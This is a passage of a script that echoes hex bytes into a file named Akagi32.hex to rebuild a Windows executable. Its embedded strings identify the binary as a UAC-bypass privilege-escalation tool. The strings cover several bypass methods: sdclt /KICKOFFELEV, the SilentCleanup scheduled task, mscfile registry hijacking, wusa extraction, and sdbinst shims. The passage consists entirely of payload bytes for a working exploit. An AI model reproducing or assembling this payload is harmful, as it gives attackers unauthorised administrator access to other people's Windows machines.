echo 5d dc 53 e8 a8 fc ff ff 83 c4 0c 85 c0 0f 84 a1 fd ff ff 8b 45 08 8b 40 04 2b c3 50 53 e8 de 03 00 00 83 c4 08 85 c0 0f 84 87 fd ff ff b8 01 00 00 00 be dc d4 40 00 87 06 85 c0 0f 85 7c 00 00 00 8b 15 d8 d4 40 00 8b ca 85 d2 7e 13 8d 04 d5 50 d4 40 00 39 38 74 08 49 83 e8 08 85 c9 7f f4 85 c9 75 4b 83 fa 0f 8d 41 0f 7f 02 8b c2 85 c0 78 2f bb 58 d4 40 00 8d 50 01 8b 75 bc 8d 49 00>>Akagi32.hex
echo e 7180>>Akagi32.hex
echo 8b 03 8b 4b 04 89 3b 89 73 04 8b f8 8b f1 8d 5b 08 83 ea 01 75 ea 8b 15 d8 d4 40 00 be dc d4 40 00 83 fa 10 7d 13 42 89 15 d8 d4 40 00 eb 0a 8b 45 bc 89 04 cd 54 d4 40 00 33 c0 87 06 b8 01 00 00 00 8b 4d f0 64 89 0d 00 00 00 00 59 5f 5e 5b 8b e5 5d c3 c3 cc cc cc cc cc cc cc cc cc cc cc 55 8b ec 56 8b 75 08 57 8b 7d 0c 8b 06 83 f8 fe 74 0d 8b 4e 04 03 cf 33 0c 38 e8 42 04 00 00 8b>>Akagi32.hex
echo e 7200>>Akagi32.hex
echo 46 08 8b 4e 0c 03 cf 33 0c 38 5f 5e 5d e9 2f 04 00 00 cc cc cc cc cc cc cc cc cc cc cc cc cc cc 55 8b ec 83 ec 1c 53 56 8b 75 0c 57 c6 45 ff 00 c7 45 f4 01 00 00 00 8b 5e 08 8d 46 10 33 1d 28 d4 40 00 50 53 89 45 ec 89 5d f8 e8 90 ff ff ff 8b 7d 10 57 e8 7b ff ff ff 8b 45 08 83 c4 0c f6 40 04 66 0f 85 ba 00 00 00 89 45 e4 8d 45 e4 89 7d e8 8b 7e 0c 89 46 fc 83 ff fe 0f 84 c9 00 00>>Akagi32.hex
echo e 7280>>Akagi32.hex
echo 00 8d 47 02 8d 04 47 8b 4c 83 04 8d 04 83 8b 18 89 45 f0 85 c9 74 65 8d 56 10 e8 ef 01 00 00 b1 01 88 4d ff 85 c0 78 66 7e 55 8b 45 08 81 38 63 73 6d e0 75 37 83 3d 04 d8 40 00 00 74 2e 68 04 d8 40 00 e8 88 02 00 00 83 c4 04 85 c0 74 1a 8b 35 04 d8 40 00 8b ce 6a 01 ff 75 08 e8 13 02 00 00 ff d6 8b 75 0c 83 c4 08 8b 45 08 8b d0 8b ce e8 c9 01 00 00 39 7e 0c 74 6c eb 58 8a 4d ff 8b>>Akagi32.hex
echo e 7300>>Akagi32.hex
echo fb 83 fb fe 74 14 8b 5d f8 e9 73 ff ff ff 8b 5d f8 c7 45 f4 00 00 00 00 eb 24 84 c9 74 2c 8b 5d f8 eb 1b 83 7e 0c fe 74 21 68 28 d4 40 00 8d 46 10 ba fe ff ff ff 50 8b ce e8 99 01 00 00 ff 75 ec 53 e8 99 fe ff ff 83 c4 08 8b 45 f4 5f 5e 5b 8b e5 5d c3 68 28 d4 40 00 8d 46 10 8b d7 50 8b ce e8 71 01 00 00 89 5e 0c 8d 5e 10 53 ff 75 f8 e8 6b fe ff ff 8b 4d f0 83 c4 08 8b d3 8b 49 08>>Akagi32.hex
echo e 7380>>Akagi32.hex
echo e8 20 01 00 00 cc cc cc cc cc cc cc cc cc cc cc 53 56 57 8b 54 24 10 8b 44 24 14 8b 4c 24 18 55 52 50 51 51 68 20 7f 40 00 64 ff 35 00 00 00 00 a1 28 d4 40 00 33 c4 89 44 24 08 64 89 25 00 00 00 00 8b 44 24 30 8b 58 08 8b 4c 24 2c 33 19 8b 70 0c 83 fe fe 74 3b 8b 54 24 34 83 fa fe 74 04 3b f2 76 2e 8d 34 76 8d 5c b3 10 8b 0b 89 48 0c 83 7b 04 00 75 cc 68 01 01 00 00 8b 43 08 e8 82>>Akagi32.hex
echo e 7400>>Akagi32.hex
echo f9 ff ff b9 01 00 00 00 8b 43 08 e8 94 f9 ff ff eb b0 64 8f 05 00 00 00 00 83 c4 18 5f 5e 5b c3 8b 4c 24 04 f7 41 04 06 00 00 00 b8 01 00 00 00 74 33 8b 44 24 08 8b 48 08 33 c8 e8 01 02 00 00 55 8b 68 18 ff 70 0c ff 70 10 ff 70 14 e8 3e ff ff ff 83 c4 0c 5d 8b 44 24 08 8b 54 24 10 89 02 b8 03 00 00 00 c3 55 ff 74 24 08 e8 64 fd ff ff 83 c4 04 8b 4c 24 08 8b 29 ff 71 1c ff 71 18 ff>>Akagi32.hex
echo e 7480>>Akagi32.hex
echo 71 28 e8 09 ff ff ff 83 c4 0c 5d c2 04 00 55 56 57 53 8b ea 33 c0 33 db 33 d2 33 f6 33 ff ff d1 5b 5f 5e 5d c3 8b ea 8b f1 8b c1 6a 01 e8 d3 f8 ff ff 33 c0 33 db 33 c9 33 d2 33 ff ff e6 55 8b ec 53 56 57 6a 00 52 68 d2 7f 40 00 51 e8 1c 00 00 00 5f 5e 5b 5d c3 55 8b 6c 24 08 52 51 ff 74 24 14 e8 a9 fe ff ff 83 c4 0c 5d c2 08 00 ff 25 14 92 40 00 ff 25 b4 92 40 00 cc cc cc cc cc cc>>Akagi32.hex
echo e 7500>>Akagi32.hex
echo 55 8b ec 8b 45 08 33 d2 53 56 57 8b 48 3c 03 c8 0f b7 41 14 0f b7 59 06 83 c0 18 03 c1 85 db 74 1b 8b 7d 0c 8b 70 0c 3b fe 72 09 8b 48 08 03 ce 3b f9 72 0a 42 83 c0 28 3b d3 72 e8 33 c0 5f 5e 5b 5d c3 cc cc cc cc cc cc cc cc cc cc cc cc cc 55 8b ec 6a fe 68 60 b4 40 00 68 20 7d 40 00 64 a1 00 00 00 00 50 83 ec 08 53 56 57 a1 28 d4 40 00 31 45 f8 33 c5 50 8d 45 f0 64 a3 00 00 00 00>>Akagi32.hex
echo e 7580>>Akagi32.hex
echo 89 65 e8 c7 45 fc 00 00 00 00 68 00 00 40 00 e8 7c 00 00 00 83 c4 04 85 c0 74 54 8b 45 08 2d 00 00 40 00 50 68 00 00 40 00 e8 52 ff ff ff 83 c4 08 85 c0 74 3a 8b 40 24 c1 e8 1f f7 d0 83 e0 01 c7 45 fc fe ff ff ff 8b 4d f0 64 89 0d 00 00 00 00 59 5f 5e 5b 8b e5 5d c3 8b 45 ec 8b 00 33 c9 81 38 05 00 00 c0 0f 94 c1 8b c1 c3 8b 65 e8 c7 45 fc fe ff ff ff 33 c0 8b 4d f0 64 89 0d 00 00>>Akagi32.hex
echo e 7600>>Akagi32.hex
echo 00 00 59 5f 5e 5b 8b e5 5d c3 cc cc cc cc cc cc 55 8b ec 8b 45 08 b9 4d 5a 00 00 66 39 08 74 04 33 c0 5d c3 8b 48 3c 03 c8 33 c0 81 39 50 45 00 00 75 0c ba 0b 01 00 00 66 39 51 18 0f 94 c0 5d c3 3b 0d 28 d4 40 00 f2 75 02 f2 c3 f2 e9 28 00 00 00 55 8b ec 6a 00 ff 15 a8 90 40 00 ff 75 08 ff 15 ac 90 40 00 68 09 04 00 c0 ff 15 30 91 40 00 50 ff 15 3c 91 40 00 5d c3 55 8b ec 81 ec 24>>Akagi32.hex
echo e 7680>>Akagi32.hex
echo 03 00 00 6a 17 e8 ec 00 00 00 85 c0 74 05 6a 02 59 cd 29 a3 e8 d5 40 00 89 0d e4 d5 40 00 89 15 e0 d5 40 00 89 1d dc d5 40 00 89 35 d8 d5 40 00 89 3d d4 d5 40 00 66 8c 15 00 d6 40 00 66 8c 0d f4 d5 40 00 66 8c 1d d0 d5 40 00 66 8c 05 cc d5 40 00 66 8c 25 c8 d5 40 00 66 8c 2d c4 d5 40 00 9c 8f 05 f8 d5 40 00 8b 45 00 a3 ec d5 40 00 8b 45 04 a3 f0 d5 40 00 8d 45 08 a3 fc d5 40 00 8b>>Akagi32.hex
echo e 7700>>Akagi32.hex
echo 85 dc fc ff ff c7 05 38 d5 40 00 01 00 01 00 a1 f0 d5 40 00 a3 f4 d4 40 00 c7 05 e8 d4 40 00 09 04 00 c0 c7 05 ec d4 40 00 01 00 00 00 c7 05 f8 d4 40 00 01 00 00 00 6a 04 58 6b c0 00 c7 80 fc d4 40 00 02 00 00 00 6a 04 58 6b c0 00 8b 0d 28 d4 40 00 89 4c 05 f8 6a 04 58 c1 e0 00 8b 0d 24 d4 40 00 89 4c 05 f8 68 2c b2 40 00 e8 e1 fe ff ff 8b e5 5d c3 cc ff 25 b0 90 40 00 00 00 00 00>>Akagi32.hex
echo e 7780>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 7800>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 7880>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 7900>>Akagi32.hex
echo d2 bc 00 00 5a bc 00 00 6c bc 00 00 7e bc 00 00 8c bc 00 00 a0 bc 00 00 b2 bc 00 00 c2 bc 00 00 4c bc 00 00 00 00 00 00 72 c2 00 00 60 c2 00 00 48 c2 00 00 36 c2 00 00 1e c2 00 00 0a c2 00 00 e2 c1 00 00 86 c2 00 00 9a c2 00 00 b0 c2 00 00 f6 c1 00 00 00 00 00 00 11 00 00 80 00 00 00 00 0d 00 00 80 0e 00 00 80 0b 00 00 80 0a 00 00 80 00 00 00 00 2e bc 00 00 20 bc 00 00 0e bc 00 00>>Akagi32.hex
echo e 7980>>Akagi32.hex
echo 00 00 00 00 70 ba 00 00 7c ba 00 00 92 ba 00 00 a2 ba 00 00 b8 ba 00 00 ca ba 00 00 ac b9 00 00 f8 ba 00 00 68 ba 00 00 30 c4 00 00 14 c4 00 00 f8 c3 00 00 e8 c3 00 00 56 ba 00 00 48 ba 00 00 3c ba 00 00 c2 b9 00 00 2c ba 00 00 1c ba 00 00 0a ba 00 00 9a b9 00 00 8a b9 00 00 72 b9 00 00 fa b9 00 00 e4 b9 00 00 d0 b9 00 00 06 bb 00 00 5e b9 00 00 48 b9 00 00 2e b9 00 00 20 b9 00 00>>Akagi32.hex
echo e 7a00>>Akagi32.hex
echo 12 b9 00 00 04 b9 00 00 f4 b8 00 00 d6 b8 00 00 c4 b8 00 00 b8 b8 00 00 ac b8 00 00 9c b8 00 00 88 b8 00 00 7a b8 00 00 6a b8 00 00 5a b8 00 00 46 b8 00 00 e0 ba 00 00 34 b8 00 00 4e c4 00 00 00 00 00 00 0e c3 00 00 d0 c2 00 00 dc c2 00 00 e6 c2 00 00 ee c2 00 00 fe c2 00 00 1e c3 00 00 32 c3 00 00 44 c3 00 00 6e c3 00 00 5c c3 00 00 4e c3 00 00 00 00 00 00 f8 bc 00 00 0a bd 00 00>>Akagi32.hex
echo e 7a80>>Akagi32.hex
echo 00 00 00 00 34 bb 00 00 26 bb 00 00 a6 bb 00 00 96 bb 00 00 b8 bb 00 00 6e bb 00 00 e0 bb 00 00 f4 bb 00 00 c0 bb 00 00 82 bb 00 00 d2 bb 00 00 46 bb 00 00 5a bb 00 00 00 00 00 00 c0 c3 00 00 b4 c3 00 00 a6 c3 00 00 00 00 00 00 8a c0 00 00 9c c0 00 00 b8 c0 00 00 cc c0 00 00 da c0 00 00 f4 c0 00 00 08 c1 00 00 78 c0 00 00 3c c1 00 00 4a c1 00 00 5a c1 00 00 74 c1 00 00 0c be 00 00>>Akagi32.hex
echo e 7b00>>Akagi32.hex
echo a4 c1 00 00 c4 c1 00 00 5e c0 00 00 48 c0 00 00 38 c0 00 00 dc c3 00 00 24 c0 00 00 06 c0 00 00 f2 bf 00 00 d6 bf 00 00 be bf 00 00 b2 bf 00 00 98 bf 00 00 7a bf 00 00 62 bf 00 00 52 bf 00 00 44 bf 00 00 34 bf 00 00 2a bf 00 00 0a bf 00 00 f2 be 00 00 d2 be 00 00 bc be 00 00 a2 be 00 00 8c be 00 00 7c be 00 00 68 be 00 00 58 be 00 00 3e be 00 00 1a be 00 00 fe bd 00 00 f0 bd 00 00>>Akagi32.hex
echo e 7b80>>Akagi32.hex
echo ce bd 00 00 b4 bd 00 00 22 c1 00 00 8c c1 00 00 00 00 00 00 44 bd 00 00 58 bd 00 00 68 bd 00 00 7a bd 00 00 8a bd 00 00 9c bd 00 00 34 bd 00 00 00 00 00 00 d4 7c 40 00 00 00 00 00 00 00 00 00 f9 14 02 00 00 00 00 00 c0 00 00 00 00 00 00 46 0b 01 00 00 00 00 00 00 c0 00 00 00 00 00 00 46 1e 6d 82 43 18 e7 ee 42 bc 55 a1 e2 61 c3 7b fe 5f ab 7a 94 5c 0a 13 4c b4 d6 4b f7 83 6f c9 f8>>Akagi32.hex
echo e 7c00>>Akagi32.hex
echo 01 14 02 00 00 00 00 00 c0 00 00 00 00 00 00 46 75 55 d0 3a 57 88 50 48 92 77 11 b8 5b db 8e 09 28 3d 5e 2e 2e 5e 3d 29 00 00 00 00 72 00 65 00 69 00 72 00 72 00 61 00 43 00 00 00 69 00 67 00 61 00 6b 00 41 00 00 00 6b 00 65 00 72 00 6e 00 65 00 6c 00 33 00 32 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 6f 00 6c 00 65 00 33 00 32 00 2e 00 64 00 6c 00 6c 00 00 00 73 00 68 00 65 00 6c 00>>Akagi32.hex
echo e 7c80>>Akagi32.hex
echo 6c 00 33 00 32 00 2e 00 64 00 6c 00 6c 00 00 00 25 00 73 00 79 00 73 00 74 00 65 00 6d 00 72 00 6f 00 6f 00 74 00 25 00 5c 00 73 00 79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00 00 00 00 00 25 00 74 00 65 00 6d 00 70 00 25 00 5c 00 00 00 50 00 6c 00 65 00 61 00 73 00 65 00 20 00 65 00 6e 00 61 00 62 00 6c 00 65 00 20 00 55 00 41 00 43 00 20 00 66 00 6f 00 72 00 20 00 74 00 68 00>>Akagi32.hex
echo e 7d00>>Akagi32.hex
echo 69 00 73 00 20 00 61 00 63 00 63 00 6f 00 75 00 6e 00 74 00 2e 00 00 00 41 00 64 00 6d 00 69 00 6e 00 20 00 61 00 63 00 63 00 6f 00 75 00 6e 00 74 00 20 00 77 00 69 00 74 00 68 00 20 00 6c 00 69 00 6d 00 69 00 74 00 65 00 64 00 20 00 74 00 6f 00 6b 00 65 00 6e 00 20 00 72 00 65 00 71 00 75 00 69 00 72 00 65 00 64 00 2e 00 00 00 00 00 54 00 68 00 69 00 73 00 20 00 57 00 69 00 6e 00>>Akagi32.hex
echo e 7d80>>Akagi32.hex
echo 64 00 6f 00 77 00 73 00 20 00 76 00 65 00 72 00 73 00 69 00 6f 00 6e 00 20 00 69 00 73 00 20 00 6e 00 6f 00 74 00 20 00 73 00 75 00 70 00 70 00 6f 00 72 00 74 00 65 00 64 00 2e 00 00 00 00 00 55 00 73 00 61 00 67 00 65 00 3a 00 20 00 41 00 6b 00 61 00 67 00 69 00 2e 00 65 00 78 00 65 00 20 00 5b 00 4d 00 65 00 74 00 68 00 6f 00 64 00 5d 00 20 00 5b 00 4f 00 70 00 74 00 69 00 6f 00>>Akagi32.hex
echo e 7e00>>Akagi32.hex
echo 6e 00 61 00 6c 00 50 00 61 00 72 00 61 00 6d 00 54 00 6f 00 45 00 78 00 65 00 63 00 75 00 74 00 65 00 5d 00 00 00 00 00 75 63 6d 00 44 00 65 00 63 00 6f 00 6d 00 70 00 72 00 65 00 73 00 73 00 50 00 61 00 79 00 6c 00 6f 00 61 00 64 00 00 00 63 00 61 00 62 00 69 00 6e 00 65 00 74 00 2e 00 64 00 6c 00 6c 00 00 00 44 65 63 6f 6d 70 72 65 73 73 00 00 43 72 65 61 74 65 44 65 63 6f 6d 70>>Akagi32.hex
echo e 7e80>>Akagi32.hex
echo 72 65 73 73 6f 72 00 00 43 6c 6f 73 65 44 65 63 6f 6d 70 72 65 73 73 6f 72 00 00 00 65 00 6c 00 6c 00 6f 00 63 00 6e 00 61 00 6b 00 2e 00 6d 00 73 00 75 00 00 00 00 00 2f 00 63 00 20 00 77 00 75 00 73 00 61 00 20 00 00 00 00 00 20 00 2f 00 65 00 78 00 74 00 72 00 61 00 63 00 74 00 3a 00 00 00 00 00 63 00 6d 00 64 00 2e 00 65 00 78 00 65 00 00 00 77 00 64 00 73 00 63 00 6f 00 72 00>>Akagi32.hex
echo e 7f00>>Akagi32.hex
echo 65 00 2e 00 64 00 6c 00 6c 00 00 00 6d 00 69 00 67 00 77 00 69 00 7a 00 5c 00 00 00 6d 00 69 00 67 00 77 00 69 00 7a 00 2e 00 65 00 78 00 65 00 00 00 00 00 6e 00 74 00 77 00 64 00 62 00 6c 00 69 00 62 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 63 00 6c 00 69 00 63 00 6f 00 6e 00 66 00 67 00 2e 00 65 00 78 00 65 00 00 00 00 00 75 00 63 00 6d 00 57 00 75 00 73 00 61 00 4d 00 65 00 74 00>>Akagi32.hex
echo e 7f80>>Akagi32.hex
echo 68 00 6f 00 64 00 00 00 45 00 6e 00 76 00 69 00 72 00 6f 00 6e 00 6d 00 65 00 6e 00 74 00 00 00 68 00 75 00 79 00 33 00 32 00 00 00 00 00 00 00 5c 00 43 00 6f 00 6d 00 65 00 74 00 2e 00 7b 00 32 00 30 00 44 00 30 00 34 00 46 00 45 00 30 00 2d 00 33 00 41 00 45 00 41 00 2d 00 31 00 30 00 36 00 39 00 2d 00 41 00 32 00 44 00 38 00 2d 00 30 00 38 00 30 00 30 00 32 00 42 00 33 00 30 00>>Akagi32.hex
echo e 8000>>Akagi32.hex
echo 33 00 30 00 39 00 44 00 7d 00 00 00 50 00 72 00 6f 00 67 00 72 00 61 00 6d 00 44 00 61 00 74 00 61 00 00 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 00 00 00 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 00 00 00 00 5c 00 53 00 74 00 61 00 72 00 74 00 20 00 4d 00 65 00 6e 00 75 00 00 00 5c 00 50 00 72 00 6f 00 67 00 72 00 61 00 6d 00 73 00 00 00 5c 00 41 00>>Akagi32.hex
echo e 8080>>Akagi32.hex
echo 64 00 6d 00 69 00 6e 00 69 00 73 00 74 00 72 00 61 00 74 00 69 00 76 00 65 00 20 00 54 00 6f 00 6f 00 6c 00 73 00 00 00 00 00 00 00 43 00 6f 00 6d 00 65 00 74 00 20 00 6d 00 65 00 74 00 68 00 6f 00 64 00 00 00 00 00 5c 00 43 00 6f 00 6d 00 70 00 75 00 74 00 65 00 72 00 20 00 4d 00 61 00 6e 00 61 00 67 00 65 00 6d 00 65 00 6e 00 74 00 2e 00 6c 00 6e 00 6b 00 00 00 00 00 4d 00 61 00>>Akagi32.hex
echo e 8100>>Akagi32.hex
echo 6e 00 61 00 67 00 65 00 00 00 00 00 72 00 75 00 6e 00 64 00 6c 00 6c 00 33 00 32 00 2e 00 65 00 78 00 65 00 20 00 00 00 2c 00 57 00 64 00 73 00 49 00 6e 00 69 00 74 00 69 00 61 00 6c 00 69 00 7a 00 65 00 00 00 00 00 53 00 6f 00 66 00 74 00 77 00 61 00 72 00 65 00 5c 00 43 00 6c 00 61 00 73 00 73 00 65 00 73 00 5c 00 6d 00 73 00 63 00 66 00 69 00 6c 00 65 00 5c 00 73 00 68 00 65 00>>Akagi32.hex
echo e 8180>>Akagi32.hex
echo 6c 00 6c 00 5c 00 6f 00 70 00 65 00 6e 00 5c 00 63 00 6f 00 6d 00 6d 00 61 00 6e 00 64 00 00 00 50 00 72 00 6f 00 76 00 50 00 72 00 6f 00 76 00 69 00 64 00 65 00 72 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 4c 00 6f 00 67 00 50 00 72 00 6f 00 76 00 69 00 64 00 65 00 72 00 2e 00 64 00 6c 00 6c 00 00 00 73 00 63 00 68 00 74 00 61 00 73 00 6b 00 73 00 2e 00 65 00 78 00 65 00 00 00 00 00>>Akagi32.hex
echo e 8200>>Akagi32.hex
echo 2f 00 72 00 75 00 6e 00 20 00 2f 00 74 00 6e 00 20 00 22 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 44 00 69 00 73 00 6b 00 43 00 6c 00 65 00 61 00 6e 00 75 00 70 00 5c 00 53 00 69 00 6c 00 65 00 6e 00 74 00 43 00 6c 00 65 00 61 00 6e 00 75 00 70 00 22 00 20 00 2f 00 69 00 00 00 00 00 25 00 73 00 79 00 73 00>>Akagi32.hex
echo e 8280>>Akagi32.hex
echo 74 00 65 00 6d 00 72 00 6f 00 6f 00 74 00 25 00 5c 00 73 00 79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00 63 00 6d 00 64 00 2e 00 65 00 78 00 65 00 00 00 00 00 00 00 53 00 6f 00 66 00 74 00 77 00 61 00 72 00 65 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 43 00 75 00 72 00 72 00 65 00 6e 00 74 00 56 00 65 00>>Akagi32.hex
echo e 8300>>Akagi32.hex
echo 72 00 73 00 69 00 6f 00 6e 00 5c 00 41 00 70 00 70 00 20 00 50 00 61 00 74 00 68 00 73 00 5c 00 00 00 00 00 00 00 00 00 53 00 6f 00 66 00 74 00 77 00 61 00 72 00 65 00 5c 00 43 00 6c 00 61 00 73 00 73 00 65 00 73 00 5c 00 65 00 78 00 65 00 66 00 69 00 6c 00 65 00 5c 00 73 00 68 00 65 00 6c 00 6c 00 5c 00 72 00 75 00 6e 00 61 00 73 00 5c 00 63 00 6f 00 6d 00 6d 00 61 00 6e 00 64 00>>Akagi32.hex
echo e 8380>>Akagi32.hex
echo 00 00 00 00 49 00 73 00 6f 00 6c 00 61 00 74 00 65 00 64 00 43 00 6f 00 6d 00 6d 00 61 00 6e 00 64 00 00 00 73 00 64 00 63 00 6c 00 74 00 2e 00 65 00 78 00 65 00 00 00 2f 00 4b 00 49 00 43 00 4b 00 4f 00 46 00 46 00 45 00 4c 00 45 00 56 00 00 00 00 00 00 00 00 00 7b 00 46 00 43 00 43 00 37 00 34 00 42 00 37 00 37 00 2d 00 45 00 43 00 33 00 45 00 2d 00 34 00 44 00 44 00 38 00 2d 00>>Akagi32.hex
echo e 8400>>Akagi32.hex
echo 41 00 38 00 30 00 42 00 2d 00 30 00 30 00 38 00 41 00 37 00 30 00 32 00 30 00 37 00 35 00 41 00 39 00 7d 00 00 00 00 00 7b 00 46 00 38 00 38 00 35 00 31 00 32 00 30 00 45 00 2d 00 33 00 37 00 38 00 39 00 2d 00 34 00 46 00 44 00 39 00 2d 00 38 00 36 00 35 00 45 00 2d 00 44 00 43 00 39 00 42 00 34 00 41 00 36 00 34 00 31 00 32 00 44 00 32 00 7d 00 00 00 00 00 53 00 6f 00 66 00 74 00>>Akagi32.hex
echo e 8480>>Akagi32.hex
echo 77 00 61 00 72 00 65 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 43 00 75 00 72 00 72 00 65 00 6e 00 74 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e 00 5c 00 55 00 6e 00 69 00 6e 00 73 00 74 00 61 00 6c 00 6c 00 5c 00 00 00 00 00 55 00 6e 00 69 00 6e 00 73 00 74 00 61 00 6c 00 6c 00 53 00 74 00 72 00 69 00 6e 00>>Akagi32.hex
echo e 8500>>Akagi32.hex
echo 67 00 00 00 73 00 64 00 62 00 69 00 6e 00 73 00 74 00 2e 00 65 00 78 00 65 00 00 00 2d 00 70 00 20 00 00 00 2f 00 71 00 20 00 2f 00 75 00 20 00 00 00 00 00 70 00 65 00 33 00 38 00 36 00 00 00 2e 00 73 00 64 00 62 00 00 00 00 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 00 00 2a 00 00 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 20 00 43 00 6f 00 72 00 70 00>>Akagi32.hex
echo e 8580>>Akagi32.hex
echo 6f 00 72 00 61 00 74 00 69 00 6f 00 6e 00 00 00 52 00 65 00 64 00 69 00 72 00 65 00 63 00 74 00 45 00 58 00 45 00 00 00 72 00 33 00 2e 00 64 00 6c 00 6c 00 00 00 00 00 61 00 6d 00 75 00 7a 00 61 00 6e 00 69 00 00 00 62 00 69 00 6e 00 61 00 72 00 79 00 70 00 61 00 74 00 63 00 68 00 30 00 31 00 00 00 69 00 73 00 63 00 73 00 69 00 63 00 6c 00 69 00 2e 00 65 00 78 00 65 00 00 00 00 00>>Akagi32.hex
echo e 8600>>Akagi32.hex
echo eb 78 55 8b ec 83 ec 10 53 56 8b f1 89 55 fc 57 8b 46 3c 8b 44 30 78 03 c6 8b 48 24 8b 50 20 03 ce 8b 58 1c 03 d6 8b 40 18 03 de 89 4d f0 33 c9 89 55 f4 89 45 f8 85 c0 74 29 8b 14 8a 03 d6 33 ff eb 0c 0f be c0 33 c7 c1 c0 03 40 42 8b f8 8a 02 84 c0 75 ee 3b 7d fc 74 12 8b 55 f4 41 3b 4d f8 72 d7 33 c0 5f 5e 5b 8b e5 5d c3 8b 45 f0 0f b7 04 48 8b 04 83 03 c6 eb eb 55 8b ec 81 ec 10>>Akagi32.hex
echo e 8680>>Akagi32.hex
echo 01 00 00 64 a1 18 00 00 00 56 57 6a 02 8b 40 30 8b 40 0c 8b 78 0c 83 65 fc 00 c7 45 f4 25 54 4d 50 c7 45 f8 25 5c 72 33 58 8b 3f 48 75 fb 8b 4f 18 ba 08 7e b3 69 e8 47 ff ff ff 8b 4f 18 8b f0 68 04 01 00 00 8d 85 f0 fe ff ff ba a2 90 38 f5 50 8d 45 f4 50 e8 28 ff ff ff ff d0 8d 85 f0 fe ff ff 50 ff d6 5f 33 c0 5e 8b e5 5d c3 00 00 00 3c 3f 78 6d 6c 20 76 65 72 73 69 6f 6e 3d 27 31>>Akagi32.hex
echo e 8700>>Akagi32.hex
echo 2e 30 27 20 65 6e 63 6f 64 69 6e 67 3d 27 75 74 66 2d 38 27 20 73 74 61 6e 64 61 6c 6f 6e 65 3d 27 79 65 73 27 3f 3e 0d 0a 3c 61 73 73 65 6d 62 6c 79 0d 0a 20 20 20 20 78 6d 6c 6e 73 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 61 73 6d 2e 76 31 22 0d 0a 20 20 20 20 78 6d 6c 6e 73 3a 61 73 6d 76 33 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 2d 6d>>Akagi32.hex
echo e 8780>>Akagi32.hex
echo 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 61 73 6d 2e 76 33 22 0d 0a 20 20 20 20 6d 61 6e 69 66 65 73 74 56 65 72 73 69 6f 6e 3d 22 31 2e 30 22 0d 0a 20 20 20 20 3e 0d 0a 20 20 20 3c 74 72 75 73 74 49 6e 66 6f 20 78 6d 6c 6e 73 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 61 73 6d 2e 76 33 22 3e 0d 0a 20 20 20 20 3c 73 65 63 75 72 69 74 79 3e 0d>>Akagi32.hex
echo e 8800>>Akagi32.hex
echo 0a 20 20 20 20 20 20 3c 72 65 71 75 65 73 74 65 64 50 72 69 76 69 6c 65 67 65 73 3e 0d 0a 20 20 20 20 20 20 20 20 3c 72 65 71 75 65 73 74 65 64 45 78 65 63 75 74 69 6f 6e 4c 65 76 65 6c 0d 0a 20 20 20 20 20 20 20 20 20 20 20 20 6c 65 76 65 6c 3d 22 72 65 71 75 69 72 65 41 64 6d 69 6e 69 73 74 72 61 74 6f 72 22 0d 0a 20 20 20 20 20 20 20 20 20 20 20 20 75 69 41 63 63 65 73 73 3d 22>>Akagi32.hex
echo e 8880>>Akagi32.hex
